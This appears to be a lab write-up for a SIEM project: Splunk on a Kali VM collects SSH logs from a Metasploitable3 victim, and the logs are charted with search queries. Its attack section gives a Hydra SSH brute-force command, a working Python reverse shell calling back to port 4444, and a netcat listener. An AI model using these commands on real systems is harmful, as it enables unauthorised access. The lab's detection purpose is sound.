# 🛡️ Phase 2: SIEM - Dashboard Analysis

## 🎯 Objective.

- Integrate logs from the **victim machine** (Metasploitable3) into a **SIEM server** (Splunk running on the attacker/Kali VM).
- Visualize attack logs to identify patterns such as brute-force attempts and reverse shells.
- Compare the behavior and timeline of events before and after compromise.

---

## 🔧 Splunk Server Setup (Kali VM)

### Installation
```bash
wget -O splunk-9.3.2.deb https://download.splunk.com/products/splunk/releases/9.3.2/linux/splunk-9.3.2-d8bb32809498-linux-2.6-amd64.deb
sudo dpkg -i splunk-9.3.2.deb
sudo /opt/splunk/bin/splunk start --accept-license
sudo /opt/splunk/bin/splunk enable boot-start
```

### Access Web Interface
Open in browser:
```
http://192.168.142.129:8000
```
Log in with:
- **Username:** admin
- **Password:** admin123

### Enable TCP 9997 Port (to receive logs)
- Navigate to **Settings > Forwarding and Receiving > Add New (Receive Data)**
- Add TCP port **9997**
- Click **Save**

---

## 🔗 Splunk Forwarder Setup (Metasploitable3 VM)

### Installation
```bash
wget -O splunkforwarder.tgz https://download.splunk.com/products/universalforwarder/releases/9.4.1/linux/splunkforwarder-9.4.1-e3bdab203ac8-linux-amd64.tgz
tar -xvzf splunkforwarder.tgz
sudo mv splunkforwarder /opt/splunkforwarder
sudo /opt/splunkforwarder/bin/splunk start --accept-license
```

### Connect to Splunk Server
```bash
sudo /opt/splunkforwarder/bin/splunk enable boot-start
sudo /opt/splunkforwarder/bin/splunk login -auth admin:admin123
sudo /opt/splunkforwarder/bin/splunk add forward-server 192.168.142.129:9997
```

### Add SSH Log Monitoring
```bash
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log
sudo /opt/splunkforwarder/bin/splunk restart
```

---

## ⚔️ Attacks Performed

### 1. SSH Brute-force with Hydra
```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.131 -t 4
```

### 2. Reverse Shell via Python Script
```python
import socket,subprocess,os
s=socket.socket()
s.connect(("192.168.142.129",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

### 3. Netcat Listener on Kali
```bash
nc -lvnp 4444
```

---

## 📊 Visualization in Splunk

### Open Splunk Search:
```
http://192.168.142.129:8000/en-US/app/search/search
```

### Sample Queries:
- Failed SSH logins:
  ```spl
  index=main "Failed password"
  ```
- Successful logins:
  ```spl
  index=main "Accepted password"
  ```
- Reverse shell detection:
  ```spl
  index=main "session opened" OR "session closed"
  ```

### Bar Chart Visualization:
- Use **Visualizations > Bar Chart**
- X-Axis: `_time`, Y-Axis: `count`, Split: `event_type`

---

## 📸 Required Screenshots

- Splunk web UI showing active log forwarding from Metasploitable3
- Search results for:
  - SSH brute-force (Hydra)
  - Reverse shell events
- Visualization bar charts for the above queries
- Terminal on Kali VM showing:
  - Hydra execution
  - Netcat receiving shell
  - Python reverse shell trigger

---

## 🧠 Conclusion

- SIEM integration was completed with Metasploitable3 as victim and Splunk on Kali as server.
- Attacks were successfully simulated and visualized.
- Dashboards clearly showed timeline escalation (Hydra ➔ login ➔ shell access).
- These logs will be compared in **Phase 3** against defense mechanisms.

> Proceed to Phase 3 for defensive implementation and validation.
> 


Attacker:

![Screenshot13](../screenshots/Screenshot13.png)
![Screenshot14](../screenshots/Screenshot14.png)
![Screenshot15](../screenshots/Screenshot15.png)
![Screenshot16](../screenshots/Screenshot16.png)
![Screenshot17](../screenshots/Screenshot17.png)


victim:

![Screenshot17](../screenshots/Screenshot17.png)
![Screenshot18](../screenshots/Screenshot18.png)
![Screenshot19](../screenshots/Screenshot19.png)
![Screenshot20](../screenshots/Screenshot20.png)
![Screenshot21](../screenshots/Screenshot21.png)
![Screenshot22](../screenshots/Screenshot22.png)
![Screenshot23](../screenshots/Screenshot23.png)
![Screenshot24](../screenshots/Screenshot24.png)
![Screenshot25](../screenshots/Screenshot25.png)
![Screenshot26](../screenshots/Screenshot26.png)
![Screenshot27](../screenshots/Screenshot27.png)
![Screenshot28](../screenshots/Screenshot28.png)
![Screenshot29](../screenshots/Screenshot29.png)
![Screenshot30](..//screenshots/Screenshot30.png)
![Screenshot31](../screenshots/Screenshot31.png)
![Screenshot32](../screenshots/Screenshot32.png)
![Screenshot33](../screenshots/Screenshot33.png)


